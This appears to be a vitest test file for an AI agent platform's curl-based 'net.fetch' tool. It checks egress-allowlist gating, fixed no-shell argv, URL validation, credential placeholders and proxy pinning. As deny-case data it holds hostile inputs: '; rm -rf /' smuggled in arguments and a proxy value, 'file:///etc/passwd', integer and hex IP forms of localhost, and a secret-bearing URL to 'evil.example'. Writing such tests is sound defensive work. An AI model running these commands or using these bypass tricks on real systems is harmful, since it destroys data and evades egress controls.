/**
 * SLICE-CAP6 (RED-first) — `net.fetch` (`curl -sS -- <url>`), the FIRST real network-egress tool.
 *
 * CAP3/4b/5 pre-built the seal-punch governance (classifier REFUSE-to-register gate / approval stage /
 * egress-allowlist fold). CAP6 ships the FIRST tool that actually NAMES `containment:"network-egress"`,
 * proving CAP5's egress primitive GATES a real in-repo tool. `net.fetch` was chosen over `git.push`
 * because its URL is in argv -> `buildExecRunProjection` extracts `networkHosts` -> the bin's egress fold
 * (CAP5) can truly gate it in-repo (git.push's egress target is NOT argv-visible -> deferred to CAP6b).
 *
 * This file pins the TOOL-LEVEL invariants (the bin END-TO-END egress gate lives in the sibling
 * `mcp/exec-mcp-server-bin.cap6.test.ts`):
 *   - REGISTRATION-GATED — `new ToolRegistry([netFetchManifest])` (DEFAULT empty wired) THROWS (CAP3 gate:
 *     "egress-allowlist" unwired); with `wired ⊇ {"egress-allowlist"}` it REGISTERS. (A composition that
 *     never wires egress refuses net.fetch — the CAP3 ordering holds.)
 *   - ARGV / STRICT / NO-SHELL — `net.fetch {url}` builds argv EXACTLY `["curl","-sS","--",<url>]`; an
 *     unknown key denies (strict); a `url` like "-X DELETE http://x" is a SINGLE literal token AFTER `--`
 *     (no flag injection, no shell).
 *   - NETWORKHOSTS PROJECTION — net.fetch's `governanceProjector` wraps `buildExecRunProjection` on the
 *     tool's argv, so a URL host becomes `networkHosts` (the credential-blind detail the bin egress fold
 *     consumes). userinfo is stripped (`user:secret@host` -> `host`).
 *   - IN-SCOPE — net.fetch is `containment:"network-egress"`, so `buildProjectionForCall` builds its
 *     projection EVEN under the default `effectful` scope (a network egress MUST be projected so the
 *     egress fold can gate it) — `sideEffect:"read"` does NOT make it out-of-scope.
 *   - CREDENTIAL PLACEHOLDER — net.fetch's OPTIONAL `toEnv` emits a CREDENTIAL PLACEHOLDER
 *     (`placeholderForKey`, NEVER a literal secret); `makeExecEffect`'s INPUT guard PASSES a placeholder
 *     and REJECTS a literal secret env value (substrate 0 calls). The placeholder is never a secret shape.
 *
 * Proven against a FAKE substrate that RECORDS the exec request (argv + env). NO live, NO real Hermes,
 * NO real network, NO real drive — the egress GATING is in-repo (PDP networkHosts fold); the real
 * network reach + the SecretResolver-at-egress resolution are deploy/EXEC2-gated.
 */
import { describe, expect, it } from "vitest";
import { placeholderForKey } from "../../../../credential/index.js";
import { buildExecRunProjection } from "../../../../policy/index.js";
import { type Primitive, ToolRegistry } from "../../../../tools/index.js";
import {
  type AdapterResult,
  type ExecCommandSpec,
  type ExecResult,
  FakeSandboxAdapter,
  type SandboxSpec,
  makeExecEffect,
} from "../../../substrate/index.js";
import {
  AGENTOS_EGRESS_PROXY_ENV,
  NET_FETCH_ARGV_PREFIX,
  buildNetFetchArgvPrefix,
  netFetchAuthEnv,
  netFetchBinding,
  netFetchManifest,
  resolveEgressProxy,
  seedBindings,
  seedRegistry,
} from "./exec-seed-tools.js";
import { type AgtScope, buildProjectionForCall } from "./governance-projection-for-call.js";

const validCtx = {
  actorId: "agent:hermes",
  tenantId: "tenant-a",
  projectId: "proj-1",
  taskId: "task-1",
  requestId: "req-1",
};

/** wired set INCLUDING egress-allowlist (what a real composition that has wired egress passes). */
const EGRESS_WIRED: ReadonlySet<Primitive> = new Set<Primitive>(["egress-allowlist"]);

/** Runtime-built secret canary matching audit/redact's `sk-...` shape (NOT a source literal). */
function secretCanary(): string {
  return `sk-${"a1B2c3D4".repeat(3)}`; // 24 alnum chars => matches /sk-[A-Za-z0-9]{16,}/
}

/** A spying Fake substrate that records argv + env per exec call. */
class SpyFakeSandboxAdapter extends FakeSandboxAdapter {
  readonly execCalls: ExecCommandSpec[] = [];
  override createSandbox(ctx: unknown, spec: SandboxSpec): Promise<AdapterResult> {
    return super.createSandbox(ctx, spec);
  }
  override execSandbox(
    ctx: unknown,
    sandboxId: string,
    spec: ExecCommandSpec,
  ): Promise<ExecResult> {
    this.execCalls.push(spec);
    return super.execSandbox(ctx, sandboxId, spec);
  }
}

// ==================================================================================================
// CAP6-(a) REGISTRATION-GATED — net.fetch is `containment:"network-egress"` => requires "egress-allowlist".
//          The DEFAULT empty-wired registry REFUSES it (CAP3 gate, fail-closed); a registry whose wired set
//          INCLUDES "egress-allowlist" REGISTERS it. `seedRegistry()` (whose default wired wires egress)
//          carries net.fetch.
//          NON-VACUITY: a mutation that ignored `wired` (always default empty) would throw even WITH
//          {"egress-allowlist"} -> the "registers" assertion flips RED.
// ==================================================================================================
describe("CAP6-(a) net.fetch registration is GATED on the egress-allowlist primitive (CAP3 gate)", () => {
  it("new ToolRegistry([netFetchManifest]) with DEFAULT empty wired THROWS (egress-allowlist unwired)", () => {
    expect(() => new ToolRegistry([{ ...netFetchManifest }])).toThrow();
    const reg = new ToolRegistry(undefined); // default empty wired
    expect(() => reg.register({ ...netFetchManifest })).toThrow();
    expect(reg.has("net.fetch")).toBe(false);
  });

  it("a registry WITH wired {egress-allowlist} REGISTERS net.fetch (the primitive is satisfied)", () => {
    const reg = new ToolRegistry([{ ...netFetchManifest }], EGRESS_WIRED);
    expect(reg.has("net.fetch")).toBe(true);
    expect(reg.lookup("net.fetch")?.containment).toBe("network-egress");
  });

  it("seedRegistry/seedBindings carry net.fetch ONLY when egress-allowlist is WIRED (else not)", () => {
    // DEFAULT (egress-UNWIRED) => net.fetch is NOT registered/bound (a composition without egress refuses
    // the network-egress tool — and never advertises its binding).
    expect(seedRegistry().has("net.fetch")).toBe(false);
    expect(seedBindings().get("net.fetch")).toBeUndefined();
    // WIRED {egress-allowlist} (what the bin passes) => net.fetch is registered + bound.
    const reg = seedRegistry(EGRESS_WIRED);
    expect(reg.has("net.fetch")).toBe(true);
    expect(seedBindings(new Map(), EGRESS_WIRED).get("net.fetch")).toBe(netFetchBinding);
  });
});

// ==================================================================================================
// CAP6-(b) MANIFEST posture — net.fetch is the spec's posture: network-egress, read, NOT idempotent, NOT
//          approval-requiring (network reads are gated by EGRESS, not approval). NON-VACUITY: a flipped
//          containment/sideEffect/requiresApproval value flips these RED.
// ==================================================================================================
describe("CAP6-(b) the net.fetch manifest declares the network-egress read posture", () => {
  it("containment network-egress, sideEffect read, idempotent false, requiresApproval false", () => {
    expect(netFetchManifest.name).toBe("net.fetch");
    expect(netFetchManifest.containment).toBe("network-egress");
    expect(netFetchManifest.sideEffect).toBe("read");
    expect(netFetchManifest.idempotent).toBe(false);
    expect(netFetchManifest.requiresApproval).toBe(false);
  });
});

// ==================================================================================================
// CAP6-(c) ARGV / NO-SHELL — the binding builds argv EXACTLY ["curl","-sS","--",<url>] (the `--` guards a
//          url that starts with `-`); a metachar/flag-shaped url is a SINGLE literal token AFTER `--` (no
//          flag injection, no shell). NON-VACUITY: dropping `--`, or splitting the url, flips these RED.
// ==================================================================================================
describe("CAP6-(c) net.fetch builds its EXACT argv from the binding (config-disabled, proxy-PINNED, `--` guard, no shell)", () => {
  it("net.fetch {url} -> argv EXACTLY [curl,-q,--globoff,-x,<proxy>,-sS,--,<url>] (config-disabled, proxy-PINNED)", () => {
    const parsed = netFetchBinding.argSchema.safeParse({ url: "https://api.allowed.example/x" });
    expect(parsed.success).toBe(true);
    if (!parsed.success) return;
    const argv = [...netFetchBinding.argvPrefix, ...netFetchBinding.toArgv(parsed.data)];
    expect(argv).toEqual([...NET_FETCH_ARGV_PREFIX, "https://api.allowed.example/x"]);
    // ⚠️ EGRESS-INTEGRITY: curl ignores config (`-q`, FIRST) + URL globs (`--globoff`), and is PINNED via
    // `-x <proxy>` to the Agent-OS-owned OpenShell egress proxy — a command-line `-x` OVERRIDES all `*_PROXY`
    // env, so an agent that can write the sandbox fs/env (exec.write_file/exec.run) cannot move the route.
    expect(argv[0]).toBe("curl");
    expect(argv[1]).toBe("-q"); // FIRST flag => .curlrc / -K config files are IGNORED
    expect(argv).toContain("--globoff"); // URL globbing disabled (no [1-1000] fan-out / host glob)
    const xi = argv.indexOf("-x");
    expect(xi).toBeGreaterThan(0); // `-x` PINS the proxy (route decided by Agent OS, not the brain)
    expect(argv[xi + 1]).toMatch(/^https?:\/\/[A-Za-z0-9.-]+:\d{1,5}$/); // a scheme://host:port proxy URL
    expect(argv).not.toContain("--noproxy"); // proxy is PINNED, NOT disabled (the old --noproxy is gone)
    expect(argv.at(-2)).toBe("--"); // the `--` guard immediately precedes the url
    // No shell wrapper, ever.
    expect(argv).not.toContain("sh");
    expect(argv).not.toContain("-c");
    expect(argv).not.toContain("bash");
  });

  it("the url is a SINGLE literal token AFTER the `--` guard (defense-in-depth; no flag injection)", () => {
    // A query string with curl-flag-shaped substrings is still ONE literal token after `--` — never split,
    // never a curl flag (the `--` mirrors grep's `-e` / git.add's `--`). The validator also rejects any
    // `-`-leading url upstream, so `--` is belt-and-suspenders; this pins the argv SHAPE either way.
    const url = "https://api.allowed.example/x?a=-X&b=DELETE";
    const parsed = netFetchBinding.argSchema.safeParse({ url });
    expect(parsed.success).toBe(true);
    if (!parsed.success) return;
    const argv = [...netFetchBinding.argvPrefix, ...netFetchBinding.toArgv(parsed.data)];
    expect(argv).toEqual([...NET_FETCH_ARGV_PREFIX, url]);
    expect(argv.at(-2)).toBe("--"); // the `--` guard is the LAST prefix token
    expect(argv.at(-1)).toBe(url); // the WHOLE url is ONE element (never split into tokens)
    expect(argv.length).toBe(NET_FETCH_ARGV_PREFIX.length + 1);
  });

  it("strict argSchema: an unknown key denies; a missing/empty url denies", () => {
    expect(
      netFetchBinding.argSchema.safeParse({ url: "https://h.example/x", argv: "; rm -rf /" })
        .success,
    ).toBe(false);
    expect(netFetchBinding.argSchema.safeParse({}).success).toBe(false);
    expect(netFetchBinding.argSchema.safeParse({ url: "" }).success).toBe(false);
  });

  // ⚠️ EGRESS-BYPASS GUARD (the critical deny-by-default): a no-authority scheme / host-less / non-http
  // URL is DENIED at the argSchema. Otherwise it would project NO networkHosts -> skip the egress fold ->
  // still reach curl. By requiring an http/https URL with a real host, EVERY admitted url produces a host
  // and is therefore always subject to the egress gate. Userinfo in the URL is rejected (credential-blind).
  it("DENIES a no-host / non-http / userinfo / IP-ambiguous URL (egress-bypass guard)", () => {
    for (const url of [
      "file:///etc/passwd", // no authority -> no host -> would skip the egress fold
      "mailto:victim@example.com", // no authority -> no host
      "data:text/plain;base64,QUJD", // no authority -> no host
      "ftp://host.example/x", // non-http scheme
      "http://", // host-less http (empty authority)
      "/relative/path", // not an absolute URL
      "not a url", // unparseable
      "https://user:pass@host.example/x", // userinfo credential in the URL (must use toEnv placeholder)
      // ⚠️ IP-AMBIGUOUS: the WHATWG-normalized connect host DIFFERS from the projection's raw token, so the
      // projected host would NOT equal curl's real destination -> DENIED (projected host MUST == destination).
      "http://2130706433/", // integer IP -> curl connects to 127.0.0.1; projection sees "2130706433"
      "http://0x7f000001/", // hex IP -> same skew
      "http://127.0.0.1/", // dotted IP literal -> not a DNS hostname (deny IP literals entirely)
      "http://[::1]/", // bracketed IPv6 literal
    ]) {
      expect(netFetchBinding.argSchema.safeParse({ url }).success).toBe(false);
    }
  });

  it("ADMITS a plain http/https URL (with port / path / query) — each produces a host", () => {
    for (const url of [
      "http://localhost:8080/x",
      "https://api.allowed.example/x?q=1",
      "https://sub.host.example:443/a/b",
    ]) {
      expect(netFetchBinding.argSchema.safeParse({ url }).success).toBe(true);
    }
  });
});

// ==================================================================================================
// CAP6-(d) NETWORKHOSTS PROJECTION — net.fetch's governanceProjector wraps buildExecRunProjection on the
//          tool's argv, so the URL host becomes `networkHosts` (the detail the bin egress fold reads).
//          Userinfo never reaches the projector (the argSchema rejects a userinfo URL — CAP6-(c)); even so
//          the underlying builder STRIPS `user:secret@host` to `host` (credential-blind defense-in-depth).
//          NON-VACUITY: removing the projector (the mutation the bin test exercises) yields no projection
//          -> the bin egress fold cannot gate it.
// ==================================================================================================
describe("CAP6-(d) net.fetch projects networkHosts = the URL host (userinfo stripped)", () => {
  it("projector(validated {url}) carries networkHosts = the BARE URL host (no port)", () => {
    expect(netFetchBinding.governanceProjector).toBeDefined();
    const parsed = netFetchBinding.argSchema.safeParse({
      url: "https://api.allowed.example/x?q=1",
    });
    expect(parsed.success).toBe(true);
    if (!parsed.success || netFetchBinding.governanceProjector === undefined) return;
    const projection = netFetchBinding.governanceProjector(parsed.data);
    expect(projection.networkHosts).toEqual(["api.allowed.example"]);
    // Apart from the host-only networkHosts override, it matches the canonical builder over the argv.
    const base = buildExecRunProjection({
      argv: [...NET_FETCH_ARGV_PREFIX, "https://api.allowed.example/x?q=1"],
    });
    expect(projection).toEqual({ ...base, networkHosts: ["api.allowed.example"] });
  });

  it("a URL with an explicit PORT projects the BARE host (host-based allowlist, no host:port needed)", () => {
    if (netFetchBinding.governanceProjector === undefined) return;
    const parsed = netFetchBinding.argSchema.safeParse({
      url: "https://api.allowed.example:8443/x",
    });
    expect(parsed.success).toBe(true);
    if (!parsed.success) return;
    // The projected host is the BARE hostname — so it matches an allowlist entry of `api.allowed.example`
    // (the operator allowlists a HOST, not a host:port). buildExecRunProjection's raw token would have kept
    // `api.allowed.example:8443`; the net.fetch projector overrides to the bare host.
    expect(netFetchBinding.governanceProjector(parsed.data).networkHosts).toEqual([
      "api.allowed.example",
    ]);
  });

  it("the underlying builder STRIPS userinfo to the bare host (credential-blind defense-in-depth)", () => {
    // A userinfo URL is rejected by net.fetch's argSchema (CAP6-(c)), so it never reaches the projector.
    // Still, the projection builder itself strips `user:secret@host` to `host` — so even if a userinfo URL
    // ever reached it, the secret would NOT land in networkHosts. (Belt-and-suspenders.)
    const projection = buildExecRunProjection({
      argv: ["curl", "-sS", "--", `https://user:${secretCanary()}@evil.example/x`],
    });
    expect(projection.networkHosts).toEqual(["evil.example"]);
    expect(JSON.stringify(projection.networkHosts)).not.toContain(secretCanary());
  });
});

// ==================================================================================================
// CAP6-(e) IN-SCOPE — net.fetch (containment:"network-egress", sideEffect:"read") is IN-SCOPE for
//          buildProjectionForCall under the DEFAULT `effectful` scope, so its networkHosts reach the bin
//          egress fold. (A read-only IN-SANDBOX tool stays OUT-OF-SCOPE — byte-identical.)
//          NON-VACUITY: if isInScope ignored network-egress containment, net.fetch's projection would be
//          undefined -> the egress fold could never gate it (the core invariant collapses).
// ==================================================================================================
describe("CAP6-(e) net.fetch is IN-SCOPE for projection under the default `effectful` scope (egress must project)", () => {
  it("buildProjectionForCall(net.fetch) returns a projection carrying networkHosts (default scope)", () => {
    // net.fetch is registered/bound ONLY in an egress-wired composition (the bin), so build the kit WITH
    // egress wired (mirrors the bin); under the DEFAULT effectful scope it is still IN-SCOPE (network-egress).
    const registry = seedRegistry(EGRESS_WIRED);
    const bindings = seedBindings(new Map(), EGRESS_WIRED);
    const scope: AgtScope = "effectful";
    const projection = buildProjectionForCall(
      { tool: "net.fetch", args: { url: "https://api.allowed.example/x" } },
      bindings,
      (n) => registry.lookup(n),
      scope,
    );
    expect(projection).toBeDefined();
    expect(projection?.networkHosts).toEqual(["api.allowed.example"]);
  });

  it("a read-only IN-SANDBOX tool (exec.cat) stays OUT-OF-SCOPE under `effectful` (byte-identical)", () => {
    const registry = seedRegistry();
    const bindings = seedBindings();
    const projection = buildProjectionForCall(
      { tool: "exec.cat", args: { path: "/etc/x" } },
      bindings,
      (n) => registry.lookup(n),
      "effectful",
    );
    expect(projection).toBeUndefined();
  });
});

// ==================================================================================================
// CAP6-(f) ⚠️ CREDENTIAL PLACEHOLDER — net.fetch's OPTIONAL `toEnv` emits a CREDENTIAL PLACEHOLDER (never a
//          literal secret). makeExecEffect's INPUT guard PASSES the placeholder env (it is not a secret
//          shape) and runs the effect; a LITERAL secret injected into the env is REJECTED (substrate 0
//          calls). This exercises the placeholder seam that EXEC2's SecretResolver-at-egress will resolve.
//          NON-VACUITY: a toEnv that emitted a literal secret would be rejected by the same guard -> the
//          "placeholder passes" assertion flips RED.
// ==================================================================================================
describe("CAP6-(f) net.fetch's toEnv emits a credential PLACEHOLDER (never a literal secret); the env guard agrees", () => {
  it("netFetchAuthEnv(KEY) emits placeholderForKey(KEY) — NEVER a literal secret", () => {
    const env = netFetchAuthEnv("NETFETCH_TOKEN");
    // The placeholder grammar is OpenShell's `openshell:resolve:env:<KEY>` — NEVER a literal secret.
    expect(env.NETFETCH_TOKEN).toBe(placeholderForKey("NETFETCH_TOKEN"));
    expect(env.NETFETCH_TOKEN).toMatch(/^openshell:resolve:env:/);
    // No env value carries a secret SHAPE.
    expect(JSON.stringify(env)).not.toMatch(/sk-[A-Za-z0-9]{16,}/);
  });

  it("netFetchAuthEnv with NO/blank key emits NO env (unauthenticated-to-allowlisted; byte-identical)", () => {
    expect(netFetchAuthEnv(undefined)).toEqual({});
    expect(netFetchAuthEnv("")).toEqual({});
    expect(netFetchAuthEnv("   ")).toEqual({});
  });

  // ⚠️ The auth KEY must be a plain uppercase env-key shape AND must NOT be a curl-control/proxy name —
  // otherwise net.fetch could be made to read a proxy/config env that alters its network destination or
  // TLS. An unsafe/forbidden key yields NO env (fail-closed), never a curl-behavior-altering env.
  it("netFetchAuthEnv REJECTS a curl-control/proxy or non-conforming key (fail-closed => {})", () => {
    for (const bad of [
      "HTTP_PROXY", // proxy routing
      "HTTPS_PROXY",
      "ALL_PROXY",
      "NO_PROXY",
      "CURL_HOME", // config home
      "HOME",
      "CURL_CA_BUNDLE", // TLS trust
      "SSL_CERT_FILE",
      "lowercase_key", // not an uppercase env-key shape
      "BAD-KEY", // hyphen not allowed
      "9LEADINGDIGIT", // must start with a letter
      "WITH SPACE",
    ]) {
      expect(netFetchAuthEnv(bad)).toEqual({});
    }
    // A conforming, non-forbidden key is accepted (as a placeholder).
    expect(netFetchAuthEnv("API_TOKEN")).toEqual({ API_TOKEN: placeholderForKey("API_TOKEN") });
  });

  it("the binding's toEnv reads the env-configured auth key (default: NO env when unset)", () => {
    expect(netFetchBinding.toEnv).toBeDefined();
    if (netFetchBinding.toEnv === undefined) return;
    const parsed = netFetchBinding.argSchema.safeParse({ url: "https://api.allowed.example/x" });
    expect(parsed.success).toBe(true);
    if (!parsed.success) return;
    const KEY = "AGENTOS_NET_FETCH_AUTH_KEY";
    const prev = process.env[KEY];
    try {
      // Unset => no env (default; unauthenticated).
      delete process.env[KEY];
      expect(netFetchBinding.toEnv(parsed.data)).toEqual({});
      // Configured => the placeholder for that key (NEVER a literal secret).
      process.env[KEY] = "NETFETCH_TOKEN";
      expect(netFetchBinding.toEnv(parsed.data)).toEqual({
        NETFETCH_TOKEN: placeholderForKey("NETFETCH_TOKEN"),
      });
    } finally {
      if (prev === undefined) delete process.env[KEY];
      else process.env[KEY] = prev;
    }
  });

  it("makeExecEffect PASSES the placeholder env (runs the effect on the Fake substrate)", async () => {
    const spy = new SpyFakeSandboxAdapter();
    const created = (await spy.createSandbox(validCtx, { image: "x" })) as { sandboxId: string };
    await spy.startSandbox(validCtx, created.sandboxId);
    const effect = makeExecEffect(spy, created.sandboxId);
    const res = await effect({
      context: validCtx,
      args: {
        argv: [...NET_FETCH_ARGV_PREFIX, "https://api.allowed.example/x"],
        env: { NETFETCH_TOKEN: placeholderForKey("NETFETCH_TOKEN") },
      },
    });
    expect(res.ok).toBe(true);
    // The placeholder did NOT trip the credential-blind input guard — the effect ran.
    expect(spy.execCalls.length).toBe(1);
    expect(spy.execCalls[0]?.env?.NETFETCH_TOKEN).toBe(placeholderForKey("NETFETCH_TOKEN"));
  });

  it("makeExecEffect REJECTS a LITERAL secret env value (input guard; substrate 0 calls)", async () => {
    const spy = new SpyFakeSandboxAdapter();
    const created = (await spy.createSandbox(validCtx, { image: "x" })) as { sandboxId: string };
    await spy.startSandbox(validCtx, created.sandboxId);
    const effect = makeExecEffect(spy, created.sandboxId);
    const canary = secretCanary();
    const res = await effect({
      context: validCtx,
      args: {
        argv: [...NET_FETCH_ARGV_PREFIX, "https://api.allowed.example/x"],
        env: { NETFETCH_TOKEN: canary },
      },
    });
    expect(res.ok).toBe(false);
    // Fail-closed: the literal secret never reached the substrate.
    expect(spy.execCalls.length).toBe(0);
    expect(JSON.stringify(res)).not.toContain(canary);
  });
});

// ==================================================================================================
// CAP6d — net.fetch PINS curl to the Agent-OS control-plane egress proxy (`-x`): provenance + fail-closed.
//   - resolveEgressProxy: UNSET => OpenShell convention default; valid scheme://host:port => that; invalid
//     => undefined (fail-closed). Sourced from the Agent OS process env ONLY (NEVER the sandbox).
//   - argvPrefix pins `-x <proxy>`; an INVALID explicit proxy => argSchema DENIES + the getter throws (no
//     bare / `--noproxy` fallback). The route is decided by Agent OS, not a brain-writable ambient proxy.
// ==================================================================================================
describe("CAP6d net.fetch egress proxy is PINNED from Agent-OS control-plane config (provenance + fail-closed)", () => {
  const save = process.env[AGENTOS_EGRESS_PROXY_ENV];
  const restore = () => {
    if (save === undefined) delete process.env[AGENTOS_EGRESS_PROXY_ENV];
    else process.env[AGENTOS_EGRESS_PROXY_ENV] = save;
  };

  it("resolveEgressProxy: unset => OpenShell convention default; valid => that; invalid => undefined", () => {
    expect(resolveEgressProxy(undefined)).toBe("http://10.200.0.1:3128");
    expect(resolveEgressProxy("")).toBe("http://10.200.0.1:3128");
    expect(resolveEgressProxy("   ")).toBe("http://10.200.0.1:3128");
    expect(resolveEgressProxy("http://proxy.internal:3128")).toBe("http://proxy.internal:3128");
    expect(resolveEgressProxy("https://10.200.0.1:8443")).toBe("https://10.200.0.1:8443");
    // INVALID => undefined (fail-closed): no scheme, no port, bad port, a shell-y value.
    expect(resolveEgressProxy("10.200.0.1:3128")).toBeUndefined();
    expect(resolveEgressProxy("http://10.200.0.1")).toBeUndefined();
    expect(resolveEgressProxy("http://10.200.0.1:0")).toBeUndefined();
    expect(resolveEgressProxy("http://10.200.0.1:99999")).toBeUndefined();
    expect(resolveEgressProxy("attacker; rm -rf /")).toBeUndefined();
  });

  it("buildNetFetchArgvPrefix pins -x to the given proxy (config/glob disabled, -- guard, no --noproxy)", () => {
    expect(buildNetFetchArgvPrefix("http://10.200.0.1:3128")).toEqual([
      "curl",
      "-q",
      "--globoff",
      "-x",
      "http://10.200.0.1:3128",
      "-sS",
      "--",
    ]);
    expect(buildNetFetchArgvPrefix("http://10.200.0.1:3128")).not.toContain("--noproxy");
  });

  it("argvPrefix: UNSET env => the default OpenShell proxy is pinned", () => {
    delete process.env[AGENTOS_EGRESS_PROXY_ENV];
    try {
      expect([...netFetchBinding.argvPrefix]).toEqual([...NET_FETCH_ARGV_PREFIX]);
      expect(netFetchBinding.argvPrefix).toContain("http://10.200.0.1:3128");
    } finally {
      restore();
    }
  });

  it("argvPrefix: a VALID explicit proxy is pinned (operator override)", () => {
    process.env[AGENTOS_EGRESS_PROXY_ENV] = "http://egress.corp:3128";
    try {
      const xi = netFetchBinding.argvPrefix.indexOf("-x");
      expect(netFetchBinding.argvPrefix[xi + 1]).toBe("http://egress.corp:3128");
    } finally {
      restore();
    }
  });

  it("FAIL-CLOSED: an INVALID explicit proxy => argvPrefix + projector THROW (no bare/--noproxy fallback)", () => {
    process.env[AGENTOS_EGRESS_PROXY_ENV] = "attacker.evil"; // no scheme/port => invalid
    try {
      // No silent fallback to a bare / --noproxy curl: both the argv builder (effect path) and the
      // governance projector fail closed, so the call cannot egress with an uncontrolled route.
      expect(() => netFetchBinding.argvPrefix).toThrow();
      expect(() =>
        netFetchBinding.governanceProjector?.({ url: "https://api.allowed.example/x" }),
      ).toThrow();
    } finally {
      restore();
    }
  });
});
